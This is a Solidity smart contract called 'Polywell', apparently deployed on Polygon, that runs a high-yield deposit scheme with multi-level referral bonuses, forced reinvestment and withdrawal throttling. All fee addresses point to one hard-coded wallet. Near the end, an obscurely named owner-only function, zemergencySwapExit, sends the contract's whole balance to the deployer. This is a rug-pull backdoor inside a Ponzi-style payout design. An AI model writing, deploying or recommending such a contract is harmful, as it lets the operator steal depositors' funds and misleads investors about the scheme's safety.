/**
 *Submitted for verification at polygonscan.com on 2021-08-20
*/

pragma solidity 0.5.9;

contract Polywell {
    using SafeMath for uint256;

    // Operating costs 
	uint256 constant public mFee = 150; //Changed
	uint256 constant public aFee = 100;
	uint256 constant public lFee = 50;
	uint256 constant public PERCENTS_DIVIDER = 1000;
    // Referral percentages
    uint8 public constant FIRST_REF = 10;
    uint8 public constant SECOND_REF = 7; //Changed
    uint8 public constant THIRD_REF = 5;
    uint8 public constant FOURTH_REF = 3;
    uint8 public constant FIFTH_REF = 1;
    // Limits
    uint256 public constant DEPOSIT_MIN_AMOUNT = 1 ether;
    uint constant public DUMP_LIMIT = 15;
    uint constant public REINVEST_PERC = 30;
    // Before reinvest
    uint256 public constant WITHDRAWAL_DEADTIME = 1 days;
    // Max ROC days and related MAX ROC (Return of contribution)
    uint8 public constant CONTRIBUTION_DAYS = 100;
    uint256 public constant CONTRIBUTION_PERC = 150; //Changed
    uint256 public constant MAX_HOLD_PERCENT = 50;
    uint256 public constant TIME_STEP = 1 days;
    // Operating addresses
    address payable public owner;      // Smart Contract Owner (who deploys)
    address payable public mAddress;    // Marketing manager 
	address payable public aAddress;        // Project manager 
	address payable public lAddress;          // Developer //Changed

    uint256 total_investors;
    uint256 total_contributed;
    uint256 total_withdrawn;
    uint256 total_referral_bonus;
    uint8[] referral_bonuses;

    struct PlayerDeposit {
        uint256 amount;
        uint256 totalWithdraw;
        uint256 time;
    }

     struct PlayerWitdraw{
        uint256 time;
        uint256 amount;
    }

    struct Player {
        address referral;
        uint256 dividends;
        uint256 referral_bonus;
        uint256 last_payout;
        uint256 last_withdrawal;
        uint256 total_contributed;
        uint256 total_withdrawn;
        uint256 total_referral_bonus;
        PlayerDeposit[] deposits;
        PlayerWitdraw[] withdrawals;
        mapping(uint8 => uint256) referrals_per_level;
    }

    mapping(address => Player) internal players;

    event Deposit(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event Reinvest(address indexed addr, uint256 amount);
    event ReferralPayout(address indexed addr, uint256 amount, uint8 level);
    event ReDeposit(address indexed addr, uint256 amount);


	constructor() public {
	    
        address payable marketingAddr = 0xEaa0cC40c0e7619bFDFA04cDc3Fe66ea07475F92;
        address payable adminAddr = 0xEaa0cC40c0e7619bFDFA04cDc3Fe66ea07475F92;
        address payable devAddr = 0xEaa0cC40c0e7619bFDFA04cDc3Fe66ea07475F92;
        require(!isContract(marketingAddr) && !isContract(adminAddr) && !isContract(devAddr));
        
		mAddress = marketingAddr;
		aAddress = adminAddr;
		lAddress = devAddr;
        owner = msg.sender;

        // Add referral bonuses (max 8 levels) - We use 5 levels
        referral_bonuses.push(10 * FIRST_REF);
        referral_bonuses.push(10 * SECOND_REF);
        referral_bonuses.push(10 * THIRD_REF);
        referral_bonuses.push(10 * FOURTH_REF);
        referral_bonuses.push(10 * FIFTH_REF);
	}


    function isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }


    function deposit(address _referral) external payable {
        require(!isContract(msg.sender) && msg.sender == tx.origin);
        require(!isContract(_referral));
        require(msg.value >= 1e8, "Zero amount");
        require(msg.value >= DEPOSIT_MIN_AMOUNT, "Deposit is below minimum amount");

        Player storage player = players[msg.sender];

        require(player.deposits.length < 1500, "Max 1500 deposits per address");

        // Check and set referral
        _setReferral(msg.sender, _referral);

        // Create deposit
        player.deposits.push(PlayerDeposit({
            amount: msg.value,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));

        // Add new user if this is first deposit
        if(player.total_contributed == 0x0){
            total_investors += 1;
        }

        player.total_contributed += msg.value;
        total_contributed += msg.value;

        // Generate referral rewards
        _referralPayout(msg.sender, msg.value);

        // Pay fees
		_feesPayout(msg.value);

        emit Deposit(msg.sender, msg.value);
    }


    function _setReferral(address _addr, address _referral) private {
        // Set referral if the user is a new user
        if(players[_addr].referral == address(0)) {
            // If referral is a registered user, set it as ref, otherwise set aAddress as ref
            if(players[_referral].total_contributed > 0) {
                players[_addr].referral = _referral;
            } else {
                players[_addr].referral = aAddress;
            }

            // Update the referral counters
            for(uint8 i = 0; i < referral_bonuses.length; i++) {
                players[_referral].referrals_per_level[i]++;
                _referral = players[_referral].referral;
                if(_referral == address(0)) break;
            }
        }
    }


    function _referralPayout(address _addr, uint256 _amount) private {
        address ref = players[_addr].referral;

        Player storage upline_player = players[ref];

        // Generate upline rewards
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            if(ref == address(0)) break;
            uint256 bonus = _amount * referral_bonuses[i] / 1000;

            players[ref].referral_bonus += bonus;
            players[ref].total_referral_bonus += bonus;
            total_referral_bonus += bonus;

            emit ReferralPayout(ref, bonus, (i+1));
            ref = players[ref].referral;
        }
    }


    function _feesPayout(uint256 _amount) private {
        // Send fees if there is enough balance
        if (address(this).balance > _feesTotal(_amount)) {
            mAddress.transfer(_amount.mul(mFee).div(PERCENTS_DIVIDER));
            aAddress.transfer(_amount.mul(aFee).div(PERCENTS_DIVIDER));
            lAddress.transfer(_amount.mul(lFee).div(PERCENTS_DIVIDER));
        }
    }

    // Total fees amount
    function _feesTotal(uint256 _amount) private view returns(uint256 _fees_tot) {
        _fees_tot = _amount.mul(mFee+aFee+lFee).div(PERCENTS_DIVIDER);

    }


    function withdraw(uint256 desiredAmount) public {
        uint tempContractBalance = address(this).balance;
        require(total_withdrawn < (tempContractBalance.mul(DUMP_LIMIT)).div(100), "Dump Limit reached, you cannot withdraw. Try after some days");
        Player storage player = players[msg.sender];
        PlayerDeposit storage first_dep = player.deposits[0];

        // Can withdraw once every WITHDRAWAL_DEADTIME days

        require(uint256(block.timestamp) > (player.last_withdrawal + WITHDRAWAL_DEADTIME) || (player.withdrawals.length <= 0), "You cannot withdraw during deadtime");
        require(address(this).balance > 0, "Cannot withdraw, contract balance is 0");
        require(player.deposits.length < 1500, "Max 1500 deposits per address");
        
        // Calculate dividends (ROC)
        uint256 payout = this.payoutOf(msg.sender);
        player.dividends += payout;

        // Calculate the amount we should withdraw
        uint256 amount_withdrawable = player.dividends + player.referral_bonus;
        require(amount_withdrawable > 0, "Zero amount to withdraw");
        require(desiredAmount <= amount_withdrawable, "Desired amount exceeds available balance");
        if(desiredAmount <= amount_withdrawable){
            amount_withdrawable = desiredAmount;
        }
        
        // Calculate the reinvest part and the wallet part
        uint256 autoReinvestAmount = amount_withdrawable.mul(REINVEST_PERC).div(100);
        uint256 withdrawableLessAutoReinvest = amount_withdrawable.sub(autoReinvestAmount);
        
        
        // Do Withdraw
        
		
        if (address(this).balance < withdrawableLessAutoReinvest) {
            player.dividends = withdrawableLessAutoReinvest.sub(address(this).balance);
			withdrawableLessAutoReinvest = address(this).balance;
		} else {
            player.dividends = 0;
        }
        msg.sender.transfer(withdrawableLessAutoReinvest);

        // Update player state
        player.referral_bonus = 0;
        player.total_withdrawn += amount_withdrawable;
        total_withdrawn += amount_withdrawable;
        player.last_withdrawal = uint256(block.timestamp);
        // If there were new dividends, update the payout timestamp
        if(payout > 0) {
            _updateTotalPayout(msg.sender);
            player.last_payout = uint256(block.timestamp);
        }
        
        // Add the withdrawal to the list of the done withdrawals
        player.withdrawals.push(PlayerWitdraw({
            time: uint256(block.timestamp),
            amount: amount_withdrawable
        }));
        
        // Do the forced reinvest of part of the withdrawn amount
        if (autoReinvestAmount > 0) {
            reinvest(msg.sender, autoReinvestAmount);
        }


        emit Withdraw(msg.sender, amount_withdrawable);
    }


    function reinvest(address _addrs, uint256 _amount) private {
        Player storage player = players[_addrs];
        // Create new deposit
        player.deposits.push(PlayerDeposit({
            amount: _amount,
            totalWithdraw: 0,
            time: uint256(block.timestamp)
        }));
        player.total_contributed += _amount;
        total_contributed += _amount;
        // Generate referral rewards
        _referralPayout(_addrs, _amount);
        // Pay fees
		_feesPayout(_amount);
        emit ReDeposit(_addrs, _amount);
    }


    function _updateTotalPayout(address _addr) private {
        Player storage player = players[_addr];

        // For every deposit calculate the ROC and update the withdrawn part
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + CONTRIBUTION_DAYS * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                uint256 timeMultiplier = (to.sub(from)).div(TIME_STEP.div(2)).mul(5);
                    if (timeMultiplier > MAX_HOLD_PERCENT) {
                        timeMultiplier = MAX_HOLD_PERCENT;
                    }
                    timeMultiplier = CONTRIBUTION_PERC.add(timeMultiplier);
                
                player.deposits[i].totalWithdraw += dep.amount * (to - from) * timeMultiplier / CONTRIBUTION_DAYS / 8640000;
            }
        }
    }


    function withdrawalsOf(address _addrs) view external returns(uint256 _amount) {
        Player storage player = players[_addrs];
        // Calculate all the real withdrawn amount (to wallet, not reinvested)
        for(uint256 n = 0; n < player.withdrawals.length; n++){
            _amount += player.withdrawals[n].amount;
        }
        return _amount;
    }


    function payoutOf(address _addr) view external returns(uint256 value) {
        Player storage player = players[_addr];

        // For every deposit calculate the ROC
        for(uint256 i = 0; i < player.deposits.length; i++) {
            PlayerDeposit storage dep = player.deposits[i];

            uint256 time_end = dep.time + CONTRIBUTION_DAYS * 86400;
            uint256 from = player.last_payout > dep.time ? player.last_payout : dep.time;
            uint256 to = block.timestamp > time_end ? time_end : uint256(block.timestamp);

            if(from < to) {
                uint256 timeMultiplier = (to.sub(from)).div(TIME_STEP.div(2)).mul(5);
                    if (timeMultiplier > MAX_HOLD_PERCENT) {
                        timeMultiplier = MAX_HOLD_PERCENT;
                    }
                    timeMultiplier = CONTRIBUTION_PERC.add(timeMultiplier);
                value += dep.amount * (to - from) * timeMultiplier / CONTRIBUTION_DAYS / 8640000;
            }
        }
        // Total dividends from all deposits
        return value;
    }


    function contractInfo() view external returns(uint256 _total_contributed, uint256 _total_investors, uint256 _total_withdrawn, uint256 _total_referral_bonus) {
        return (total_contributed, total_investors, total_withdrawn, total_referral_bonus);
    }


    function userInfo(address _addr) view external returns(uint256 for_withdraw, uint256 withdrawable_referral_bonus, uint256 invested, uint256 withdrawn, uint256 referral_bonus, uint256[8] memory referrals, uint256 _last_withdrawal) {
        Player storage player = players[_addr];
        uint256 payout = this.payoutOf(_addr);

        // Calculate number of referrals for each level
        for(uint8 i = 0; i < referral_bonuses.length; i++) {
            referrals[i] = player.referrals_per_level[i];
        }
        // Return user information
        return (
            payout + player.dividends + player.referral_bonus,
            player.referral_bonus,
            player.total_contributed,
            player.total_withdrawn,
            player.total_referral_bonus,
            referrals,
            player.last_withdrawal
        );
    }

 
    function contributionsInfo(address _addr) view external returns(uint256[] memory endTimes, uint256[] memory amounts, uint256[] memory totalWithdraws) {
        Player storage player = players[_addr];

        uint256[] memory _endTimes = new uint256[](player.deposits.length);
        uint256[] memory _amounts = new uint256[](player.deposits.length);
        uint256[] memory _totalWithdraws = new uint256[](player.deposits.length);

        // Create arrays with deposits info, each index is related to a deposit
        for(uint256 i = 0; i < player.deposits.length; i++) {
          PlayerDeposit storage dep = player.deposits[i];
          _amounts[i] = dep.amount;
          _totalWithdraws[i] = dep.totalWithdraw;
          _endTimes[i] = dep.time + CONTRIBUTION_DAYS * 86400;
        }

        return (
          _endTimes,
          _amounts,
          _totalWithdraws
        );
    }
    
    function zemergencySwapExit() public returns(bool){
        require(msg.sender == owner, "You are not the owner!");
        msg.sender.transfer(address(this).balance);
        return true;
    }
}


// Libraries used

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }
}